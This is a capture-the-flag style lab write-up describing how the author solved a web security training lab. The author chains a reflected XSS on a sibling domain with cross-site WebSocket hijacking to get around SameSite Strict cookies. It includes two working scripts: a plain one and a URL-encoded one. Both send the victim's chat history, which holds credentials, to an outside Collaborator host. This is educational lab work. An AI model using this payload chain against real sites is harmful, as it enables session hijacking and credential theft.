# Practitioner Lab 157: SameSite Strict bypass via sibling domain

---

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on WebSocket vulnerabilities before attempting this lab.

When the lab started I saw that when the websockets send a ready it then sends its whole history. But the chat knows who its talking to based on its cookie.

```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

The site has SameSite Strict which means that it won’t transfer any cookies. 

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled.png)

Based on this its only the start of a session. 

My next step is to see how I can make it SameSite so that it can send the cookie.

When looking at the response I saw this:

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%201.png)

I decided to visit the /resources/js/chat.js

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%202.png)

This allows another Origin.

which is another domain so I decided to visit it to see. 

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%203.png)

Its vulnerable to xss

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%204.png)

Now I need a way to include this into the query sting so my plan is to attempt this with a GET request to see if the site accepts it.

And it does. 

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%205.png)

I went into decoded and encoded the full csrf Payload I did above. 

Then I added it to the query string. 

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%206.png)

It worked. 

```
<script>
document.location="https://cms-0a47004004abda098275662c00390017.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%37%30%30%34%30%30%34%61%62%64%61%30%39%38%32%37%35%36%36%32%63%30%30%33%39%30%30%31%37%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%74%7a%77%79%33%63%68%37%6c%6f%34%66%33%75%6b%6d%73%75%79%76%32%62%38%35%67%77%6d%6e%61%6a%79%38%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=qwdqw";
</script>

```

This send it to my collaborator.

![Untitled](Practitioner%20Lab%20157%20SameSite%20Strict%20bypass%20via%20si%207bb6d7208ecb42af9af7e533cc5cda2d/Untitled%207.png)

Which results in me getting the information. 

This solved the lab after I was able to log in.